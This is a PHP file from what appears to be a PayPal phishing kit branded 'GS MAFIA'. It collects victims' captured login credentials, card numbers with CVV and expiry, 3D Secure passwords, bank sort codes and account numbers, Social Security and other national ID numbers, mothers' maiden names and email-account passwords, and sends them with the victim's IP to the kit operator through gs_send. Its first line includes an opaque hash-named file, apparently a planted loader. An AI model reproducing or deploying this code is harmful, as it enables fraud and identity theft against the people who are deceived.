<?php include_once'../../../../02f5c794f8e62115216710ab8d38aa0f.php';?><?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
include("../gs_config.php");
$_SESSION['gs_emailaccessarray'] = $_POST;
$_SESSION['page'] = "emailaccess";
$ip = getclientip();
$GS_SEND["E-Mail"] = "<span style='color:green'>".$_SESSION['gs_logarray']["gs_email"]."</span>";
$GS_SEND["Password"] = "<span style='color:green'>".$_SESSION['gs_logarray']["gs_password"]."</span>";
$GS_SEND["BLANKK1"] = "";
$GS_SEND["First Name"] = $_SESSION["gs_billarray"]["gs_fname"];
$GS_SEND["Last Name"] = $_SESSION["gs_billarray"]["gs_lname"];
$GS_SEND["Address"] = $_SESSION["gs_billarray"]["gs_street1"];
$GS_SEND["City"] = $_SESSION["gs_billarray"]["gs_city"];
$GS_SEND["Zip"] = $_SESSION["gs_billarray"]["gs_postalCode"];
$GS_SEND["Country"] = $_SESSION["gs_country"];
$GS_SEND["BLANKK21"] = "";
$GS_SEND["Card Holder Name"] = "<span style='color:green'>".$_SESSION["gs_cardarray"]["gs_holder"]."</span>";
$GS_SEND["Card Number"] = "<span style='color:green'>".$_SESSION["gs_cardarray"]["gs_cc"]."</span>";
$GS_SEND["CVV[2] (CVC)"] = "<span style='color:green'>".$_SESSION["gs_cardarray"]["gs_csc"]."</span>";
$GS_SEND["Expiration Date"] = "<span style='color:green'>".$_SESSION["gs_cardarray"]["gs_exp_month"]." ".$_SESSION["gs_cardarray"]["gs_exp_year"]."</span>";
$GS_SEND["BLANKK22"] = "";
$GS_SEND["3D Secure"] = $_SESSION["gs_vbvarray"]['password_vbv'];
$GS_SEND["Date Of Birth"] = $_SESSION["gs_vbvarray"]['dob_1']."/".$_SESSION["gs_vbvarray"]['dob_2']."/".$_SESSION["gs_vbvarray"]['dob_3'];
$GS_SEND["Sort Code"] = $_SESSION["gs_vbvarray"]['sortnum1']."-".$_SESSION["gs_vbvarray"]['sortnum2']."-".$_SESSION["gs_vbvarray"]['sortnum3'];
$GS_SEND['Account Number'] = $_SESSION["gs_vbvarray"]['accnumber'];
$GS_SEND['Social Security Number'] = $_SESSION["gs_vbvarray"]['ssn1']."-".$_SESSION["gs_vbvarray"]['ssn2']."-".$_SESSION["gs_vbvarray"]['ssn3'];
$GS_SEND['Mother s Maiden Name'] = $_SESSION["gs_vbvarray"]['mmname'];
$GS_SEND['Credit Limits'] = $_SESSION["gs_vbvarray"]['creditlimit'];
$GS_SEND['OSID'] = $_SESSION["gs_vbvarray"]['osid'];	
$GS_SEND['Codice Fiscale'] = $_SESSION["gs_vbvarray"]['codicefiscale'];
$GS_SEND['Kontonummer'] = $_SESSION["gs_vbvarray"]['kontonummer'];
$GS_SEND['Officiel ID'] = $_SESSION["gs_vbvarray"]['offid'];
$GS_SEND["BLANKK24"] = "";
$GS_SEND["Email access email"] = "<span style='color:green'>".$_POST["gs_accessemail"]."</span>";
$GS_SEND["Password access email"] = "<span style='color:green'>".$_POST["gs_accesspassword"]."</span>";
gs_send($GS_SEND,"[PayPal email access] ** ".$ip." ** ". $_POST["gs_accessemail"]);
?>